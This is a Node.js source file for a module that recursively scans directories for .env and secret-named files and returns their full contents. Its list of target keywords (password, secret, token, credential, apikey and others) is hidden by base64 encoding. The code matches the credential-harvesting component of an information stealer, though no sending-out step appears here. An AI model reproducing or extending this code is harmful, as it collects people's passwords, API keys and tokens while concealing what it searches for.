const fs = require("fs");
const path = require("path");
const logger = require("../utils/logger");
const { deobfuscate } = require("../utils/crypto");

/** @type {string[]} */
const SUSPICIOUS_KEYWORDS = [
    "cGFzc3dvcmQ=", "cGFzc3dk", "c2VjcmV0", "YXBpa2V5", "YXBpX2tleQ==",
    "dG9rZW4=", "Y3JlZGVudGlhbA==", "cHJpdmF0ZQ==", "Y29uZmln", "ZW52", "a2V5"
].map(deobfuscate);

/** @type {Set<string>} */
const SKIP_DIRS = new Set([
    "bm9kZV9tb2R1bGVz", "LmdpdA==", "LnZlbnY=", "X19weWNhY2hlX18=",
    "dmVudg==", "ZW52", "LmdpdGxhYg==", "LmdpdGh1Yg==", "dmVuZG9y", "Ymlu", "b2Jq"
].map(deobfuscate));

const MAX_DEPTH = 50;
const KV_PAIR_RE = /^\s*(?:export\s+)?[A-Za-z_]\w*\s*=/m;

/**
 * @typedef {{ path: string, name: string, matchedKeyword: string, content: string }} EnvFileInfo
 */

/**
 * Check if a filename matches env-file or secret-keyword patterns.
 * @param {string} filename
 * @returns {boolean}
 */
function isTargetFile(filename) {
    const lower = filename.toLowerCase();
    if (lower === ".env" || lower.startsWith(".env.") || lower.endsWith(".env")) return true;
    return SUSPICIOUS_KEYWORDS.some(kw => lower.includes(kw));
}

/**
 * Check if a string contains at least one `KEY=value` pair.
 * @param {string} content
 * @returns {boolean}
 */
function hasKeyValuePairs(content) {
    return KV_PAIR_RE.test(content);
}

/**
 * Read and validate a file's content. Returns null if the file has no key-value pairs.
 * @param {string} filePath
 * @returns {string|null}
 */
function readFileContent(filePath) {
    try {
        const stat = fs.lstatSync(filePath);
        if (!stat.isFile()) return null;
        if (stat.size > 100 * 1024) {
            logger.debug(`Skipping large file: ${filePath} (${stat.size} bytes)`);
            return "[File exceeds 100KB limit]";
        }

        let content;
        try {
            content = fs.readFileSync(filePath, "utf8");
        } catch {
            content = fs.readFileSync(filePath, "latin1");
        }

        if (!hasKeyValuePairs(content)) return null;
        return content;
    } catch (err) {
        logger.debug(`Cannot read file: ${filePath} — ${err.message}`);
        return "[Unable to read file]";
    }
}

/**
 * Recursively scan directories for env/secret files containing key-value pairs.
 * Returns an array of file info objects with path, name, matched keyword, and content.
 * @param {string[]} directories
 * @param {number} [depth=0]
 * @param {Set<string>} [seen]
 * @returns {Array<{path: string, name: string, matchedKeyword: string, content: string}>}
 */
function findEnvFiles(directories, depth = 0, seen = new Set()) {
    const results = [];
    if (depth > MAX_DEPTH) return results;

    for (const dir of directories) {
        if (!fs.existsSync(dir)) continue;

        let realPath;
        try {
            realPath = fs.realpathSync(dir);
        } catch {
            logger.debug(`Cannot resolve real path: ${dir}`);
            continue;
        }

        if (seen.has(realPath)) {
            logger.debug(`Skipping symlink loop: ${realPath}`);
            continue;
        }
        seen.add(realPath);

        let entries;
        try {
            entries = fs.readdirSync(dir, { withFileTypes: true });
        } catch (err) {
            logger.debug(`Permission denied: ${dir} — ${err.message}`);
            continue;
        }

        for (const entry of entries) {
            const fullPath = path.join(dir, entry.name);
            let stat;
            try {
                stat = fs.lstatSync(fullPath);
            } catch {
                continue;
            }

            if (stat.isSymbolicLink()) {
                logger.debug(`Skipping symlink: ${fullPath}`);
                continue;
            }

            if (stat.isDirectory()) {
                if (SKIP_DIRS.has(entry.name.toLowerCase())) continue;
                if (entry.name.startsWith(".")) continue;
                results.push(...findEnvFiles([fullPath], depth + 1, seen));
            } else if (stat.isFile() && isTargetFile(entry.name)) {
                const matchedKeyword = SUSPICIOUS_KEYWORDS.find(kw =>
                    entry.name.toLowerCase().includes(kw)
                ) || deobfuscate("ZW52");
                const content = readFileContent(fullPath);
                if (content !== null) {
                    results.push({
                        path: fullPath,
                        name: entry.name,
                        matchedKeyword,
                        content
                    });
                }
            }
        }
    }

    return results;
}

module.exports = { findEnvFiles };
